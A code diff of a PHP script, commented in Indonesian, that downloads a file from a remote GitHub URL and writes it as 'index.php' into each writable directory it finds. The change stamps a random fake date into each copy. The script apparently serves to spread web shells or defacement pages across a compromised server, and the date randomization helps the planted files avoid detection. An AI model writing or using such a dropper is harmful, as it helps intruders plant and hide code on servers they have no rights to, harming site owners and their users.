@@ -44,10 +44,20 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
     return $result;
 }
 
-// Ambil isi file dari GitHub
-$content = fetch_from_url($remoteFile);
+// Fungsi untuk membuat tanggal acak (tahun minimal 2021)
+function generate_random_datetime() {
+    $year = rand(2021, (int)date('Y'));
+    $month = rand(1, 12);
+    $day = rand(1, cal_days_in_month(CAL_GREGORIAN, $month, $year));
+    $hour = rand(0, 23);
+    $minute = rand(0, 59);
+    return sprintf('%04d-%02d-%02d %02d:%02d', $year, $month, $day, $hour, $minute);
+}
 
-if (!$content || strlen($content) < 10) {
+// Ambil isi file dari GitHub
+$originalContent = fetch_from_url($remoteFile);
+
+if (!$originalContent || strlen($originalContent) < 10) {
     exit("Gagal mengunduh konten dari GitHub.\n");
 }
 
@@ -66,10 +76,21 @@ $successCount = 0;
 $uploadedPaths = [];
 
 foreach ($targetFolders as $folder) {
+    // Buat tanggal acak untuk setiap file
+    $randomDateTime = generate_random_datetime();
+
+    // Ganti bagian tanggal di konten
+    $modifiedContent = preg_replace(
+        '/(\/\/\s*Tanggal:\s*)\d{4}-\d{2}-\d{2} \d{2}:\d{2}/i',
+        '${1}' . $randomDateTime,
+        $originalContent
+    );
+
+    // Simpan ke file
     $target = $folder . DIRECTORY_SEPARATOR . 'index.php';
-    if (@file_put_contents($target, $content)) {
+    if (@file_put_contents($target, $modifiedContent)) {
         $successCount++;
-        $uploadedPaths[] = $target;
+        $uploadedPaths[] = $target . " (Tanggal: $randomDateTime)";
     }
 }
 
